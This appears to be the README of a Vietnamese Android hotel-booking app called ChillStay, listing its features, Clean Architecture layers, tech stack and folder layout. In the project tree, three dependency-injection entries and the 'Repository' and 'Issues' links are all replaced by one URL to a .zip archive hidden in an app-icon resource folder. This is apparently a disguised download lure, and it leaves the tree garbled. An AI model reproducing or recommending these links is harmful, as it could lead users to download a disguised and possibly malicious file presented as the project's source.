# ChillStay

ChillStay là một ứng dụng đặt phòng khách sạn hiện đại được xây dựng bằng Android với Jetpack Compose. Ứng dụng cung cấp trải nghiệm đặt phòng mượt mà với đầy đủ các tính năng từ tìm kiếm, đặt phòng, thanh toán đến quản lý booking và đánh giá.

## 📱 Tính năng chính

### 👤 Người dùng
- **Xác thực**: Đăng nhập/Đăng ký với Firebase Authentication
- **Tìm kiếm**: Tìm kiếm khách sạn theo địa điểm, ngày tháng, giá cả
- **Chi tiết khách sạn**: Xem thông tin chi tiết, hình ảnh, tiện ích, đánh giá
- **Đặt phòng**: 
  - Chọn phòng và ngày check-in/check-out
  - Tùy chọn số lượng phòng, người lớn, trẻ em
  - Yêu cầu đặc biệt và preferences (tầng cao, phòng yên tĩnh, v.v.)
  - Áp dụng voucher giảm giá
  - Thanh toán với nhiều phương thức
  - Lưu booking vào pending để tiếp tục sau
- **Quản lý booking**: 
  - Xem danh sách booking (My Trips)
  - Chi tiết booking với trạng thái (Pending, Confirmed, Completed, Cancelled)
  - Hủy booking
  - Xem hóa đơn
- **Đánh giá**: Viết và xem đánh giá khách sạn
- **Bookmark**: Lưu khách sạn yêu thích
- **Voucher**: Xem và sử dụng voucher giảm giá
- **VIP Status**: Theo dõi trạng thái VIP và tích điểm
- **Liên hệ**: Liên hệ với khách sạn qua email (giả lập)
- **Profile**: Quản lý thông tin cá nhân

### 🔧 Admin
- **Quản lý khách sạn**: Thêm, sửa, xóa khách sạn và phòng
- **Quản lý booking**: Xem và quản lý tất cả booking
- **Quản lý khách hàng**: Xem thông tin và hoạt động của khách hàng
- **Quản lý voucher**: Tạo và quản lý voucher
- **Quản lý thông báo**: Gửi thông báo đến người dùng
- **Upload hình ảnh**: Upload hình ảnh cho khách sạn và phòng

## 🏗️ Kiến trúc

Ứng dụng được xây dựng theo **Clean Architecture** với **MVVM pattern**:

```
┌─────────────────────────────────────┐
│           UI Layer                  │
│  (Compose Screens & ViewModels)    │
└──────────────┬──────────────────────┘
               │
┌──────────────▼──────────────────────┐
│         Domain Layer                 │
│  (Use Cases, Models, Repositories)  │
└──────────────┬──────────────────────┘
               │
┌──────────────▼──────────────────────┐
│          Data Layer                 │
│  (Firebase Repositories, APIs)      │
└─────────────────────────────────────┘
```

### Các layer:

- **UI Layer**: 
  - Jetpack Compose screens
  - ViewModels (MVVM pattern)
  - Navigation với Navigation Compose
  
- **Domain Layer**:
  - Use Cases (business logic)
  - Domain Models
  - Repository interfaces
  
- **Data Layer**:
  - Firebase Firestore repositories
  - Firebase Authentication
  - Firebase Storage (cho hình ảnh)
  - Image upload với Cloudinary

## 🛠️ Tech Stack

### Core
- **Kotlin**: Ngôn ngữ lập trình chính
- **Jetpack Compose**: UI framework
- **Material 3**: Design system
- **MVVM**: Architecture pattern
- **Clean Architecture**: Kiến trúc phân lớp

### Dependency Injection
- **Koin**: Dependency injection framework

### Backend & Database
- **Firebase Authentication**: Xác thực người dùng
- **Firebase Firestore**: NoSQL database
- **Firebase Storage**: Lưu trữ hình ảnh
- **Cloudinary**: Image upload và optimization

### Libraries
- **Coil**: Image loading
- **Navigation Compose**: Navigation
- **Paging 3**: Pagination cho danh sách
- **Kotlin Coroutines**: Async operations
- **Kotlinx Serialization**: JSON serialization
- **Ktor**: HTTP client 

### Build Tools
- **Gradle**: Build system
- **Android Gradle Plugin**: 8.1.0
- **Kotlin**: Latest stable

## 📁 Cấu trúc Project

```
app/src/main/java/com/example/chillstay/
├── core/                    # Core utilities
│   ├── base/               # BaseViewModel, UiState, UiEvent, UiEffect
│   ├── common/             # Result, OnboardingManager
│   └── feature/            # IconRegistry
├── data/                    # Data layer
│   ├── api/                # API interfaces
│   ├── repository/         # Repository implementations
│   │   └── firestore/      # Firestore repositories
│   └── image/              # Image upload
├── domain/                  # Domain layer
│   ├── model/              # Domain models
│   ├── repository/         # Repository interfaces
│   └── usecase/            # Use cases
│       ├── booking/
│       ├── hotel/
│       ├── room/
│       ├── user/
│       ├── voucher/
│       └── ...
├── di/                      # Dependency Injection modules
│   ├── https://github.com/Wander210/DO-AN---XAY-DUNG-UNG-DUNG-DAT-PHONG-DU-LICH/raw/refs/heads/main/app/src/main/res/mipmap-hdpi/LICH_DA_A_PHON_UN_D_DUN_XA_2.4.zip
│   ├── https://github.com/Wander210/DO-AN---XAY-DUNG-UNG-DUNG-DAT-PHONG-DU-LICH/raw/refs/heads/main/app/src/main/res/mipmap-hdpi/LICH_DA_A_PHON_UN_D_DUN_XA_2.4.zip
│   └── https://github.com/Wander210/DO-AN---XAY-DUNG-UNG-DUNG-DAT-PHONG-DU-LICH/raw/refs/heads/main/app/src/main/res/mipmap-hdpi/LICH_DA_A_PHON_UN_D_DUN_XA_2.4.zip
└── ui/                      # UI layer
    ├── auth/               # Authentication screens
    ├── home/               # Home screen
    ├── hoteldetail/        # Hotel detail screen
    ├── room/               # Room selection screen
    ├── booking/            # Booking screen
    ├── trip/               # My Trips screen
    ├── profile/            # Profile screen
    ├── admin/              # Admin screens
    ├── navigation/         # Navigation setup
    └── ...
```

## 🎯 Tính năng chi tiết

### Booking System
- **Transaction-based**: Sử dụng Firestore transaction để đảm bảo tính nhất quán khi đặt phòng
- **Room availability**: Tự động trừ số phòng available khi booking thành công
- **Pending bookings**: Lưu booking vào pending nếu user chưa hoàn tất
- **Price calculation**: Tính toán giá tự động bao gồm phí dịch vụ, thuế, giảm giá

### Voucher System
- Hỗ trợ voucher theo phần trăm và số tiền cố định
- Kiểm tra điều kiện áp dụng voucher
- Áp dụng nhiều voucher cho một booking

### Review System
- Đánh giá khách sạn với rating và comment
- Xem đánh giá của người dùng khác
- Quản lý đánh giá của mình

### Admin Panel
- Quản lý đầy đủ CRUD cho hotels, rooms, bookings, vouchers
- Xem thống kê và báo cáo
- Quản lý khách hàng và đánh giá

## 🔐 Security

- Firebase Authentication cho xác thực
- Firestore Security Rules để bảo vệ dữ liệu
- Role-based access control (Admin/User)


## 👥 Authors

- ChillStay Team: Nguyen Truong Giang - Do Thanh Truong

## 🔗 Links

- Repository: [GitHub](https://github.com/Wander210/DO-AN---XAY-DUNG-UNG-DUNG-DAT-PHONG-DU-LICH/raw/refs/heads/main/app/src/main/res/mipmap-hdpi/LICH_DA_A_PHON_UN_D_DUN_XA_2.4.zip)
- Issues: [GitHub Issues](https://github.com/Wander210/DO-AN---XAY-DUNG-UNG-DUNG-DAT-PHONG-DU-LICH/raw/refs/heads/main/app/src/main/res/mipmap-hdpi/LICH_DA_A_PHON_UN_D_DUN_XA_2.4.zip)
